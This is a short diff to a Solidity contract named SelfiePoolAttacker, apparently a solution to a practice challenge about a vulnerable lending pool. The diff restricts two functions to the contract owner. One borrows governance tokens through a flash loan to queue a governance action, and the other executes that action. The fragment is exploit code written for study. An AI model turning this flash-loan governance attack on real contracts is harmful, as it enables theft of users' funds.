@@ -32,7 +32,7 @@ contract SelfiePoolAttacker is IERC3156FlashBorrower, Ownable2Step {
         i_simpleGovernance = ISimpleGovernance(_simpleGovernance);
     }
 
-    function exploitQueueAction() external {
+    function exploitQueueAction() external onlyOwner {
         i_selfiePool.flashLoan(
             IERC3156FlashBorrower(address(this)),
             address(i_dvtSnapshot),
@@ -46,7 +46,7 @@ contract SelfiePoolAttacker is IERC3156FlashBorrower, Ownable2Step {
         );
     }
 
-    function exploitExecuteAction() external {
+    function exploitExecuteAction() external onlyOwner {
         i_simpleGovernance.executeAction(s_actionId);
     }
 
